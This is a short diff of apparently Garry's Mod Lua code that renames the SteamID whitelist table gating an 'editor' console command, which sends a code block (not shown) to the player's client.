@@ -297,6 +297,6 @@ local code = [[
 		]]
 
 concommand.Add('editor', function(ply)
-	if !great[ply:SteamID()] then return end
+	if !Core64users[ply:SteamID()] then return end
 		RunOnCL(ply, code)
 end)
